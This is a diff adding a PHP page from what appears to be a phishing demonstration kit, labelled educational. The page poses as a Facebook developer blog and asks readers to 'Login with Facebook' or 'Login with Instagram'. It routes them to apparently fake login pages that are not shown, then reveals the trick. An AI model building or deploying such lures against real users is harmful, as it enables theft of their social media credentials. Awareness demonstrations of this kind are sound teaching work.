@@ -1,0 +1,21 @@
+<?php
+// This is made for educational purpose only
+// this demonstrate how simple are phishing attaks and we shhould be alert while browsing through internet 
+
+// warning!: do not use this against anyone without their permission
+?>
+
+<?php
+# facebook developer blog explaning phishing and asking login for read more
+# credits: https://github.com/i-am-abhi747
+
+if(isset($_GET["k"]))
+{
+  $condetional_div = '<p class="_8zym _8xdr _8xdj _8xd- _8yp1 _93n_ _8zf- _9ao6">Phishing is exectly like what you are experienced now. Well its fake website, just now you might gave your login details to us, if not then good job! for further reading real website is <a href="https://www.upguard.com/blog/phishing#:~:text=Phishing%20scams%20trick%20victims%20by,that%20matches%20the%20legitimate%20site.">here</a></p>';
+}
+else{
+  $condetional_div = '<div class="container"><div class="row"><h1 style="text-align:center; font-size: 20px;margin-top: 80px;margin-bottom: 20px;">Login for continue reading</h1><div class="col"><a href="/?p=2&&r=/?p=3%26%26k=1%23continue" class="fb btn"><i class="fa fa-facebook fa-fw"></i> Login with Facebook</a><a href="/?p=1&&r=/?p=3%26%26k=1%23continue" class="insta btn"><i class="fa fa-instagram fa-fw"></i> Login with Instagram</a></div></div></div>';
+}
+
+include "templete3/index.php";
+?>
